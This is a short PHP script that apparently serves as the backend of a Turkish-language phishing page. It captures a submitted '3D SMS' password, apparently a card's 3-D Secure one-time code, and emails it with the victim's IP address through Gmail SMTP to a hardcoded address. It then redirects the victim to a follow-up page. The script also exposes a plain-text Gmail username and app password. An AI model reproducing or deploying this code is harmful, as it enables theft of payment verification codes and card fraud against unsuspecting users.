
<?php
use PHPMailer\PHPMailer\PHPMailer;

require_once 'phpmailer/Exception.php';
require_once 'phpmailer/PHPMailer.php';
require_once 'phpmailer/SMTP.php';


$mail = new PHPMailer(true);

$alert = 'HATA';
if(isset($_POST['submit'])){
  $ip = $_SERVER["REMOTE_ADDR"];
  $sms = $_POST['sms'];



  try{
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = '0xc0000c4@gmail.com'; // Gmail address which you want to use as SMTP server
    $mail->Password = 'dgqcwtkzmchaoqae'; // Gmail address Password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = '587';
    $mail->setFrom('0xc0000c4@gmail.com'); // Gmail address which you used as SMTP server
    $mail->addAddress('0xc0000c4@gmail.com'); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)


    
    $mail->isHTML(true);
    $mail->Subject = '3D SMS Bilgisi';
    $mail->Body = "SMS Sifresi : $sms <br>

    <br>
    <br>
    <br>
    <br>
    <br>
    -------------------------------------------
    <br>
     Gonderen IP : $ip";
   
   
   

    $mail->send();
header("Location:/sorgulama1.html") ;
} catch (Exception $e){
$alert = '<div class="alert-error">
<span>'.$e->getMessage().'</span>
</div>';
}
}
?>
